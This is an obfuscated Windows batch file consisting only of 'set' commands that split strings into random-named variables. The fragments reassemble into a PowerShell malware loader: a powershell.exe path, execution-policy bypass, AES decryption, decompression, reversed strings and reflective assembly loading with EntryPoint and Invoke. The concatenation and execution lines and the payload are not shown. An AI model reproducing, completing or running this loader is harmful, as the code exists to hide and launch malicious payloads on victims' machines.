@echo off
set "MaAXmHacBp=ws"
set "NbYtELwFwW=\v"
set "SpKAuOFYct=\W"
set "QFhdIXaCtx= C"
set "dwqcrvTGgX=Po"
set "oFtTczTRqp=nd"
set "lGdZDxmTmF= /"
set "XLDVeIutvN=em"
set "twhbESSNSY=ll"
set "wEvLxmcnYr=do"
set "aBFcNpjZgO=0\"
set "TgxNXlwWFo=rs"
set "dGIMnFrSnC=32"
set "RWWCjhjpeT=xe"
set "zGkaxovniD=s\"
set "CuXRlnSCRL=po"
set "TLalXeTNzf=st"
set "vHNcGqSxLA=in"
set "cwsPiRXRzA=Sy"
set "pQWvxanstb=he"
set "cKIwuQhkbo=ow"
set "EIWxNqFZtI=we"
set "PBjTVeVEjD=Wi"
set "HpHiFrQaMX=y "
set "NUhMfoUZdh=we"
set "CwyHtTfZWt=he"
set "JkFyVvWkTZ=.e"
set "hSLbbbXLan=py"
set "LraLGvhQPY=rS"
set "wrLBZNCrBZ=:\"
set "ewUEAsEhox=ll"
set "ebUYndnbTR=co"
set "odQhHWYLpf=1."
set "MXzVBajyAp=cd"
set "FfSbqdRuGf= %~dp0"
set "hrJvrKCloF=yTo("
set "vOQLJtnkgS=$Oxq"
set "YlFDffvntZ=vj0m"
set "SfGeQBIkig=ach "
set "SmGvIgjibx=ring"
set "SpEvjzNiyt=rt]:"
set "japHLMwktb=yste"
set "TFXfKyLwEp=gMod"
set "gIxEkGtjiE=c = "
set "yRfawLDIyX=6esa"
set "ZcoXiQfVoj=ay()"
set "HBLnRjXbCE=ecry"
set "zQxLiEyRpo=O.Me"
set "BVsqmTrxkR=;$lq"
set "xsNYNFKYqy=, (,"
set "WskDfNxaVL=ose("
set "icCOxqWnHb=ress"
set "CGpniCAkOV=);$c"
set "kXEFdrnCGq=.IO."
set "AAvVXIfoan=).Sp"
set "CxCmICrTYV=ert]"
set "qfTztBnlpK=Fina"
set "gjTpdpVhCU=pose"
set "cyOumuJwzO=$NKS"
set "tgiwhABIqI=stem"
set "HZvcMTbGgg=-Obj"
set "AIehLhaVQm=tem."
set "CaMJEZiAZB=p, 0"
set "WPhJQBhVtX=brea"
set "vrsemfFEQN=ispo"
set "vloTcOTVeW=tion"
set "DQmVBUdTsu=OYI."
set "RqPpXCbBwa=Obje"
set "BTJJedVcQu='')("
set "suRDLbHare=F.En"
set "XSazLOzWTY=tryP"
set "vByFBEjDmJ=FlF "
set "EIEyTtzgNE=('da"
set "KndCQNFiMu=.Ass"
set "puknqscUYM=ddin"
set "SXAAUUBYWE=]::("
set "bnpROxkazs= '')"
set "liRDWarGez=0O+g"
set "cseWaavsTF=pStr"
set "fQiuQLhlpL=sion"
set "sbokIPJalk= [Sy"
set "NkwMOihjmz=OYI "
set "rYvSenCeGD=znAc"
set "iPFpJJjCwY=th('"
set "cLzZkrEHWT=);$t"
set "LsGiSDSiZD=se()"
set "jdslDAStUg=iron"
set "CWfAzmxxrl=trea"
set "QLoxwbqQuw=bypa"
set "KJKJPCATZb=:: '"
set "dcZAotqNwg=v4Ir"
set "blUcnpSucV=stem"
set "VkvjYOJLir=saBm"
set "kZIwxZZjkR=n ''"
set "iFOzKKGMtx=ptor"
set "svzGaLLcBY= if "
set "rRFnyaCIEu=oArr"
set "MjBPQSLImQ=ct S"
set "jmHimjkWuw=YI.T"
set "UBKSWUSBeE=hy.A"
set "ERMimjJdgx=.Com"
set "uIfpnWbNKQ=pher"
set "BDGxzRVdaL=-joi"
set "eYHeIcPLDW=.Cop"
set "PFXvDbzJnS=ke($"
set "zmhUsouscA=Conv"
set "BXSxWQjcEX=cp);"
set "YYjfjFBLsa== $t"
set "dyOhIcAwQX=Syst"
set "TUCvoNhaNX=; };"
set "rqzqdHFbCa=nirt"
set "czYpsdEWSa=e = "
set "tyWUxhJpBj=comm"
set "JVPTAEEJKG=Comp"
set "JMVcZxEvlb=Fo7l"
set "fOBlesgcJm= = $"
set "rzaNCWHysz=$Oxq"
set "eHHDAETVAK=yste"
set "mCpRLrbKDq=vert"
set "eEppBBPosB=orF'"
set "EeEPgGKOxx=);$O"
set "WJAFiCYclY=embl"
set "nakUACZXwp=urit"
set "RkMSbajMQx= [st"
set "YsYZBnCrcd=join"
set "oMjiEjDWTp=oin "
set "uzPqJtZWUK=  $J"
set "mcCGEYJdhu=d;$t"
set "GeIRKvvCGH=Sue."
set "ExxkpVJrkZ=em.I"
set "aacxVuonKm=Bmor"
set "xdXGsBnBOD=pose"
set "mbJmzhUqro=.-16"
set "OTrzIcozgd=::('"
set "yureevwJhr='txe"
set "NCQHecIxfT=();$"
set "MjlJmQbEXy=.Sec"
set "zPvylzSAIp=isfL"
set "HblmINXQns=$tIR"
set "MlLFVDjylE=am;$"
set "WtJUlepRaY===')"
set "MVRivoVduW=e = "
set "XbkSDkTtZv=RLgf"
set "NVPfPGRIPx=sGUc"
set "WBSMmTeRhc=);$l"
set "hRCyNvMdhK=gth)"
set "VsVPBpyfIu=16] "
set "qHWbZLBEac=F'[-"
set "rZSebVWCmP=ress"
set "OliSKEYQRn= New"
set "XwaXobsOCU=..-1"
set "LlrUXrStCO=nage"
set "okVSDXnNRQ=.Cry"
set "mohJhFqqCN=k; }"
set "RFGLSAsWkP== [S"
set "EYxbNekjgS=UGTu"
set "iJnUjVJysC=);$t"
set "oLXdFFHAmb=tsWi"
set "huOHsCVnJr= '')"
set "PpFbSsRwNV='[-1"
set "hqJaAxVKtB=gnir"
set "aenBAKDGdb=..-1"
set "uKDwCmzTQv=-nop"
set "sDlCfIdUBD=Comp"
set "OchqijmdoH=;$FG"
set "DbJbVyyrAs=OyzA"
set "RAMdxFrUuz=m.IO"
set "fgDxZTdhGI=esMa"
set "CHTsFkCVNI=Oc.T"
set "HbHprYMgAJ=)($J"
set "XCphwHvCeY=.Key"
set "CwXCAMheEu=F.Pa"
set "fbzCIpyloz=$znA"
set "myMUlvevMc=, $z"
set "tTUfjlqLYc=form"
set "GCIEsCgmRm=flec"
set "smaTwCooxX=$Oxq"
set "HaJXfNoQZo=rity"
set "hEdjUPtFAb=yste"
set "NoLAIDCAgI=and "
set "GhhtzsVToe=thS."
set "pPsJWAcflW=[IO."
set "GWFNyFqKGj=gF.I"
set "qACEPQRrKQ=rtS4"
set "kfIJTcWwkg=$FGO"
set "mIwqfaOycN=NTbE"
set "iCgQJPlbuL=rans"
set "OKDvCOJrsB=eam("
set "hqBrirWtFK=xqOc"
set "ePDqxOedVA= = N"
